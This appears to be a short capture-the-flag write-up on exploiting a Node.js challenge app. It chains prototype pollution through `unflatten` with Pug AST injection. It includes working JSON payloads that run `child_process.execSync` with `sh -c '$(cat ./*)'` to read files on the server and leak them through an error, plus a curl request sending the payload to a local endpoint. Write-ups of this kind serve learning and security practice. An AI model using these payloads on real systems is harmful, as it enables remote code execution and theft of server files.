Starting with the code we can see it runs out input through `unflatten`. Doing some research around this suggests it will expand any var so we maybe able to do prototype polution.

Following on with that I ran it locally and set a break point just after the unflatten with the following test
```json
{
    "song.name": "ASTa la vista baby",
    "__proto__.test": "test"
}
```
Doing this proved I can do prototype polution by passing in data

Next I started looking at the pug framework and found that its possible via the `block` value as mentioned in https://blog.p6.is/AST-Injection/#Pug

So using this data we can build the below query to get the server to run a command and then try to run that output, therefor throwing an error so we can exfiltrate the data obtained
```bash
sh -c '$(cat ./*)'
```

```json
{
    "song.name": "ASTa la vista baby",
    "__proto__.block": {"type":"Text","line":"process.mainModule.require('child_process').execSync(`sh -c '$(cat ./*)'`)"}
}
```

```bash
CURL -X POST -H "Content-Type: application/json" -F "{\"song.name\":\"ASTa la vista baby\",\"__proto__.block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require('child_process').execSync(`sh -c '$(cat ./*)'`)\"}}" http://127.0.0.1:1337/api/submit
```